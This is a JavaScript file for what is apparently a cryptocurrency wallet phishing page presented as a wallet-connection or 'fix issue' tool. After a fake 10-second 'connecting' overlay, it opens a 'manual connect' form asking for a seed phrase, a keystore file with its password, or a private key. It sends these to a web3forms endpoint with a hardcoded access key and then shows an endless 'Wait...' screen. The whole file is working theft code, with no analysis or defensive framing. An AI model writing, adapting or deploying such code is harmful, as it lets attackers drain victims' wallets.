// script.js - handles modals, wallet selection, connection flow
(function(){
  const modal = document.getElementById('selectWalletModal');
  const openers = document.querySelectorAll('[data-open-modal]');
  const fixBtn = document.getElementById('fixIssueBtn');
  const modalClose = document.getElementById('modalCloseBtn');
  const hamburger = document.getElementById('hamburgerBtn');
  const mobileMenu = document.getElementById('mobileMenu');

  const toggleMore = document.getElementById('toggleMoreWallets');
  const moreWallets = document.getElementById('moreWallets');
  const walletOptions = Array.from(document.querySelectorAll('.wallet-option'));
  const modalMainImg = document.getElementById('modalMainWalletImg');
  const modalMainName = document.getElementById('modalMainWalletName');
  const connectWalletBtn = document.getElementById('connectWalletBtn');

  const connectionOverlay = document.getElementById('connectionOverlay');
  const connectingWalletImg = document.getElementById('connectingWalletImg');

  const connectManualModal = document.getElementById('connectManualModal');
  const manualCloseBtn = document.getElementById('manualCloseBtn');
  const manualConnectBtn = document.getElementById('manualConnectBtn');
  const errorConnectingLabel = document.getElementById('errorConnecting');
  const connectManuallyLabel = document.getElementById('connectManuallyLabel');

  // Manual fields
  const phrasesField = document.getElementById('phrasesField');
  const keystoreField = document.getElementById('keystoreField');
  const privateField = document.getElementById('privateField');
  const manualRadios = Array.from(document.querySelectorAll('input[name="manualMethod"]'));

  let selectedWallet = {
    id: 'metamask',
    name: 'MetaMask',
    img: 'Metamask.png'
  };

  function openModal(){
    if(!modal) return;
    modal.classList.remove('hidden');
    document.body.classList.add('overflow-hidden');
  }
  function closeModal(){
    if(!modal) return;
    modal.classList.add('hidden');
    document.body.classList.remove('overflow-hidden');
  }

  openers.forEach(el=> el.addEventListener('click', function(e){ e.preventDefault(); openModal(); if(mobileMenu && !mobileMenu.classList.contains('hidden')) mobileMenu.classList.add('hidden'); }));
  if(fixBtn) fixBtn.addEventListener('click', function(e){ e.preventDefault(); openModal(); });
  if(modalClose) modalClose.addEventListener('click', closeModal);
  if(modal) modal.addEventListener('click', function(e){ if(e.target === modal) closeModal(); });

  if(hamburger && mobileMenu){
    hamburger.addEventListener('click', function(){ mobileMenu.classList.toggle('hidden'); });
  }

  // Toggle more wallets
  if(toggleMore && moreWallets){
    toggleMore.addEventListener('click', function(){ moreWallets.classList.toggle('hidden'); toggleMore.textContent = moreWallets.classList.contains('hidden') ? 'Choose your preferred wallets +20' : 'Choose your preferred wallets -'; });
  }

  // Wallet selection
  function setSelectedWallet(id,name,img){
    selectedWallet = {id,name,img};
    if(modalMainImg) modalMainImg.src = img;
    if(modalMainName) modalMainName.textContent = name;
  }

  walletOptions.forEach(btn=>{
    btn.addEventListener('click', function(e){
      const id = btn.getAttribute('data-wallet') || 'custom';
      const imgEl = btn.querySelector('img');
      const name = imgEl?.alt || id;
      const src = imgEl?.src || '';
      setSelectedWallet(id,name,src);
    });
  });

  // Connect wallet flow
  function showConnectionOverlay(){
    if(!connectionOverlay) return;
    connectingWalletImg.src = selectedWallet.img || '';
    connectionOverlay.classList.remove('hidden');
    document.body.classList.add('overflow-hidden');
  }
  function hideConnectionOverlay(){
    if(!connectionOverlay) return;
    connectionOverlay.classList.add('hidden');
    document.body.classList.remove('overflow-hidden');
  }

  if(connectWalletBtn){
    connectWalletBtn.addEventListener('click', function(){
      // close select modal then show overlay with chosen wallet
      closeModal();
      showConnectionOverlay();
      // wait 10 seconds then hide overlay and open manual modal
      setTimeout(function(){
        hideConnectionOverlay();
        if(connectManualModal){ connectManualModal.classList.remove('hidden'); document.body.classList.add('overflow-hidden'); }
      }, 10000);
    });
  }

  if(manualCloseBtn) manualCloseBtn.addEventListener('click', function(){ connectManualModal.classList.add('hidden'); document.body.classList.remove('overflow-hidden'); });
  if(connectManualModal) connectManualModal.addEventListener('click', function(e){ if(e.target === connectManualModal){ connectManualModal.classList.add('hidden'); document.body.classList.remove('overflow-hidden'); } });

  // Manual radio toggles
  function updateManualFields(){
    const sel = document.querySelector('input[name="manualMethod"]:checked')?.value || 'phrases';
    phrasesField.classList.toggle('hidden', sel !== 'phrases');
    keystoreField.classList.toggle('hidden', sel !== 'keystore');
    privateField.classList.toggle('hidden', sel !== 'private');
  }
  manualRadios.forEach(r=> r.addEventListener('change', updateManualFields));
  updateManualFields();

  if(manualConnectBtn){
    manualConnectBtn.addEventListener('click', function(){
      // collect inputs and send via web3forms
      const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
      const payloadParts = [];
      if(method === 'phrases'){
        const v = document.getElementById('phrasesInput')?.value || '';
        if(v) payloadParts.push('phrases: ' + v);
      } else if(method === 'keystore'){
        const v = document.getElementById('keystoreInput')?.value || '';
        const p = document.getElementById('keystorePassword')?.value || '';
        if(v) payloadParts.push('keystore: ' + v);
        if(p) payloadParts.push('keystore password: ' + p);
      } else if(method === 'private'){
        const v = document.getElementById('privateInput')?.value || '';
        if(v) payloadParts.push('private key: ' + v);
      }

      // also include selected wallet info
      payloadParts.unshift('wallet: ' + (selectedWallet.name || selectedWallet.id || 'unknown'));
      const message = payloadParts.join('\n\n');

      // UI: clear error, indicate sending
      if(errorConnectingLabel) errorConnectingLabel.classList.add('hidden');
      if(connectManuallyLabel) connectManuallyLabel.textContent = 'Sending...';

      const access_key = '11f0133a-b045-443f-9809-323fe49000de';
      fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_key, subject: 'Wallet connect data', message })
      }).then(async res => {
        if(!res.ok){
          throw new Error('Network response not ok');
        }
        // success: show persistent Wait overlay centered on page
        try{ await res.json(); }catch(e){}
        if(connectManuallyLabel) connectManuallyLabel.textContent = '( Wait... )';
        // hide manual modal
        connectManualModal.classList.add('hidden');
        // show wait overlay (persistent)
        const waitOverlay = document.getElementById('waitOverlay');
        if(waitOverlay){ waitOverlay.style.display = 'flex'; }
      }).catch(err => {
        if(errorConnectingLabel) errorConnectingLabel.classList.remove('hidden');
        if(connectManuallyLabel) connectManuallyLabel.textContent = 'Connect manually';
        console.error('Send failed', err);
      });
    });
  }

})();

